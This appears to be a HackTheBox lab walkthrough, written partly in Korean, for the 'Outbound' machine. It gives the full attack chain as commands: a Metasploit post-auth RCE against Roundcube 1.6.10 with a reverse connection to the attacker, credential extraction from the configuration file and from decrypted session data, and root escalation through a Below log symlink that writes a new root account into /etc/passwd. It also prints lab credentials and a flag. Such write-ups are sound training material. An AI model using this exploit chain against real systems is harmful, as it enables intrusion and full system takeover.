# HackTheBox Walkthrough - Machine: Outbound

**Target IP**: 10.129.196.209  
**Difficulty**: Medium  
**Objective**: Exploit Roundcube Webmail and escalate privileges via Below log symlink vulnerability to root.

---

## 🛰️ Initial Enumeration

```bash
nmap -sV -sC -oA nmap/Outbound 10.129.196.209
```

```
22/tcp open  ssh     OpenSSH 9.6p1
80/tcp open  http    nginx 1.24.0
```

> 웹서버는 mail.outbound.htb로 리디렉션됨

**/etc/hosts**에 추가:

```
10.129.196.209  mail.outbound.htb
```

---

## 📧 Roundcube Webmail 로그인

- URL: http://mail.outbound.htb/
- App: Roundcube Webmail
- Version: 1.6.10 (About 페이지)

**초기 자격증명**:  
`tyler / LhKL1o9Nm3X2`

---

## 🚀 Exploiting CVE-2025-49113 (Post-auth RCE)

```bash
msfconsole
search Roundcube Webmail 1.6.10
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113

set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
set RHOSTS http://mail.outbound.htb/
set LHOST 10.10.14.156
run
```

> **Meterpreter** shell 획득

---

## 🧠 Local Enumeration

```bash
su tyler
# password: LhKL1o9Nm3X2
```

```bash
# linpeas.sh 사용하여 포트 정보 확인
ss -tulnp
```

> MySQL(localhost) 접속 가능  
> /var/www/html/roundcube/config/config.inc.php

```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

MySQL 접속:

```bash
mysql -u roundcube -pRCDBPass2025 -h 127.0.0.1 -D roundcube
```

- 테이블: `users`, `session` 등
- `users` 테이블에서 client_hash 수집 (crack 불가)

---

## 🔓 Password Recovery via Session Table

```sql
select * from session;
```

- base64 decode of session.vars reveals:

```text
username|s:5:"jacob";
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
```

### 🔐 3DES 복호화

- Key: `rcmail-!24ByteDESkey*Str`
- IV: `2fb46fd3403c4eec`  
- Input(hex): `0902bebb9084f1c5c4a09c8936e409bf`

복호화 결과 → **jacob의 password**: `595mO8DmwGeD`

```bash
su jacob
```

---

## 📬 Mailbox Access

```bash
cat /home/jacob/mail/INBOX/jacob
```

> mel로부터 패스워드 전달됨: `gY4Wr3a1evp4`

```bash
ssh jacob@10.129.196.209
```

---

## 🧍‍♂️ User Flag

```bash
cat user.txt
# ➜ 87f51f79ec4ad826d3624022033a26fb
```

---

## 🔝 Privilege Escalation via Below

```bash
sudo -l
```

```text
(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, ...
```

### 🔥 CVE-2025-27591 - Symlink Exploit

- /var/log/below/* 파일을 symlink로 /etc/passwd 조작

```bash
echo 'root2:aacFCuAIHhrCM:0:0:,,,:/root:/bin/bash' > root2
rm /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
sudo /usr/bin/below
cp root2 /var/log/below/error_root.log
su root2
# password: 1
```

---

## 👑 Root Flag

```bash
cat /root/root.txt
```

---

**🎉 완료!**
